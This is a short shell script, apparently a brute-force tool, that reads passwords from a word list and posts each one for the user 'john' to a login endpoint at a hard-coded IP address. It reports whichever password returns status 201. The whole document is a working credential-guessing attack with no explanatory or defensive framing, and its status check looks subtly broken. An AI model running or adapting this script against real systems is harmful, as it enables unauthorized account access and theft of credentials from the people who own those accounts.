#!/bin/sh
filename="dict.txt"
while read -r line; do
data='{ "username":"john", "password":"'$line'" }'
status=$(curl -X POST --data "$data" http://178.63.53.42:8080/login)
if [ $status -eq 201 ]
then
echo log in successfully!!
echo The correct password is "$line"
fi
done < "$filename"